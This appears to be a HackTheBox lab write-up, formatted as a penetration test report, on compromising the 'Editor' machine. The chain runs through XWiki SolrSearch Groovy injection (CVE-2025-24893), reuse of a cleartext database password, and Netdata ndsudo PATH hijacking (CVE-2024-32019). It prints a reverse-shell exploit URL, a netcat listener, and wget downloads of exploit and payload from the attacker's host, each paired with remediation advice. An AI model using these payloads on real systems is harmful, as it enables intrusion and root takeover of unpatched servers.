# Penetration Test Report — Editor
**Platform:** HackTheBox
**Difficulty:** Easy
**Category:** Linux — Wiki Platform RCE, Credential Reuse, SUID Privilege Escalation
**Author:** D24yK4r4
**Target:** editor.htb

---

## Executive Summary

Editor is a medium-rated Linux machine centred on an XWiki deployment with a critical unauthenticated Remote Code Execution vulnerability (CVE-2025-24893). The XWiki instance was accessible via the `wiki.editor.htb` virtual host and running version 15.10.8, which is affected by a Groovy template injection flaw exploitable through the unauthenticated SolrSearch endpoint. Initial shell access was obtained as the `xwiki` service user. Post-exploitation enumeration of the XWiki Hibernate configuration file revealed database credentials stored in cleartext, which were successfully reused to authenticate as user `oliver` via SSH. Privilege escalation to root was achieved by exploiting CVE-2024-32019, a PATH hijacking vulnerability in Netdata's SUID helper binary `ndsudo`, present in version 1.45.2.

**Overall Risk: Critical**

---

## Scope & Methodology

**Target:** `http://editor.htb/`
**Approach:** Black-box
**Tools used:** Nmap, Nuclei, ffuf, curl, Python3 (CVE PoC), gcc, Netcat, wget

**Methodology:**
1. Full TCP port scan and service identification
2. Virtual host enumeration via ffuf
3. CVE-2025-24893 exploitation — unauthenticated RCE via XWiki SolrSearch Groovy injection
4. Post-exploitation enumeration — configuration files, credential reuse
5. Privilege escalation via CVE-2024-32019 — Netdata `ndsudo` PATH hijacking

---

## Findings

---

### F-01 — Unauthenticated RCE in XWiki via SolrSearch Groovy Injection (CVE-2025-24893)

**Severity:** Critical
**CVE:** CVE-2025-24893
**CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Classification:** CWE-94 — Improper Control of Generation of Code (Code Injection)
**OWASP:** A03:2021 — Injection

**Description:**
XWiki versions prior to 15.10.11 and 16.4.1 contain a critical unauthenticated remote code execution vulnerability in the SolrSearch endpoint. The `text` parameter of the `/xwiki/bin/get/Main/SolrSearch` endpoint is evaluated as a Groovy template without authentication. An attacker can inject a Groovy reverse shell payload wrapped in `{{async}}{{groovy}}` template syntax, achieving code execution as the user running the XWiki/Jetty process.

Port scanning identified an XWiki instance on port 8080 (Jetty 10.0.20). Virtual host enumeration via ffuf identified `wiki.editor.htb` resolving to the same target. The XWiki version (15.10.8) was visible in the web interface, confirming the installation fell within the affected range. The CVE-2025-24893 PoC was used to deliver a base64-encoded bash reverse shell via the SolrSearch endpoint with no authentication required.

**Evidence:**
```bash
# Virtual host enumeration
ffuf -u http://10.129.231.23/ -H "Host: FUZZ.editor.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac
# Found: wiki [Status: 302]

# Set up listener
nc -lnvp 1337

# Run CVE-2025-24893 PoC
git clone https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC.git
cd CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
chmod +x CVE-2025-24893-dbs.py
python3 CVE-2025-24893-dbs.py
# Target URL: http://editor.htb:8080
# Attacker IP: REDACTED
# Port: 1337

# Final exploit URL (URL-decoded for clarity):
# GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}"bash -c {echo,<b64payload>}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}
```

```
listening on [any] 1337 ...
connect to [REDACTED] from (UNKNOWN) [10.129.231.23] 52302
$ whoami
xwiki
```

**Impact:**
Full unauthenticated remote code execution as the `xwiki` service user. Provides filesystem access to XWiki configuration files and serves as the entry point for all subsequent post-exploitation activity.

**Remediation:**
Upgrade XWiki to version 15.10.11 or 16.4.1 or later. Restrict access to the XWiki instance at the network level — it should not be publicly reachable unless required. Apply authentication to all administrative and search endpoints. Run XWiki as a dedicated low-privilege service account with minimal filesystem permissions.

---

### F-02 — Database Credentials Stored in Cleartext Configuration File

**Severity:** Medium
**CVSS:** 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**Classification:** CWE-312 — Cleartext Storage of Sensitive Information
**OWASP:** A02:2021 — Cryptographic Failures

**Description:**
The XWiki Hibernate database configuration file `/etc/xwiki/hibernate.cfg.xml` is readable by the `xwiki` service user and contains the MySQL database password in plaintext. The password was found to be reused as the SSH login credential for the local user `oliver`, enabling lateral movement from the service account to a full interactive user session.

**Evidence:**
```bash
cat /etc/xwiki/hibernate.cfg.xml
```

```xml
<property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false...</property>
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">REDACTED</property>
```

```bash
# Credential reuse — SSH login as oliver
ssh oliver@editor.htb
# Password: REDACTED

oliver@editor:~$ cat user.txt
REDACTED
```

**Impact:**
An attacker with local shell access as `xwiki` can read the database credential and reuse it to authenticate as `oliver` via SSH. This enables lateral movement to a user account with a real interactive shell, home directory, and broader system access.

**Remediation:**
Enforce a unique password policy — service account database passwords must not be reused as OS user credentials. Restrict permissions on `/etc/xwiki/hibernate.cfg.xml` to the minimum required service account only (mode `640`, owned by `root:xwiki`). Consider externalising secrets to a secrets manager rather than storing them in application configuration files.

---

### F-03 — Local Privilege Escalation via Netdata `ndsudo` PATH Hijacking (CVE-2024-32019)

**Severity:** High
**CVE:** CVE-2024-32019
**CVSS:** 8.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
**Classification:** CWE-426 — Untrusted Search Path
**OWASP:** A05:2021 — Security Misconfiguration

**Description:**
Netdata versions ≥ 1.44.0 and < 1.45.3 ship a SUID helper binary `ndsudo` at `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`. The binary restricts which command names may be executed but resolves them using the caller's `PATH` environment variable rather than an absolute path. A local user can place a malicious binary with a permitted name (e.g., `nvme`) earlier in their `PATH` and invoke `ndsudo`, causing the helper to execute the attacker-controlled binary with root privileges. The installed version on this machine was 1.45.2, which falls within the affected range.

**Evidence:**
```bash
# Identify netdata version
/opt/netdata/usr/sbin/netdata -v
# netdata v1.45.2

# On attacker machine — compile static payload and host via HTTP
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
python3 -m http.server 8000

# On victim — download exploit and payload
wget http://REDACTED:8000/CVE-2024-32019.sh
wget http://REDACTED:8000/nvme
chmod +x CVE-2024-32019.sh

# Run exploit
./CVE-2024-32019.sh
```

```
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/home/oliver# cat /root/root.txt
REDACTED
```

**Impact:**
Full privilege escalation from any local user to root. Unrestricted read and write access to the entire host filesystem, including SSH keys, shadow file, and all root-owned data.

**Remediation:**
Upgrade Netdata Agent to version 1.45.3 or later, where `ndsudo` resolves command paths using hardcoded absolute paths rather than the caller's `PATH`. As a short-term mitigation, remove the SUID bit from `ndsudo` if Netdata's privileged functionality is not required (`chmod u-s /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`). Review all SUID binaries on the system and remove the bit from any that are not strictly necessary.

---

## Findings Summary

| ID | Title | Severity | CVE | CWE | OWASP |
|----|-------|----------|-----|-----|-------|
| F-01 | Unauthenticated RCE — XWiki SolrSearch Groovy Injection | Critical | CVE-2025-24893 | CWE-94 | A03:2021 |
| F-02 | Database Credentials in Cleartext Config File | Medium | — | CWE-312 | A02:2021 |
| F-03 | Privilege Escalation via Netdata ndsudo PATH Hijacking | High | CVE-2024-32019 | CWE-426 | A05:2021 |

---

## Answers

| Question | Answer |
|----------|--------|
| Open ports | `22 (SSH), 80 (HTTP), 8080 (XWiki / Jetty)` |
| Discovered virtual host | `wiki.editor.htb` |
| Vulnerable service | `XWiki 15.10.8` |
| CVE used for initial access | `CVE-2025-24893` |
| Vulnerable endpoint | `/xwiki/bin/get/Main/SolrSearch` |
| Initial shell user | `xwiki` |
| Credential source | `/etc/xwiki/hibernate.cfg.xml` |
| Lateral movement target | `oliver` (SSH password reuse) |
| Privilege escalation binary | `ndsudo` (Netdata v1.45.2) |
| CVE used for privesc | `CVE-2024-32019` |
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

---

*HackTheBox — Editor — D24yK4r4*
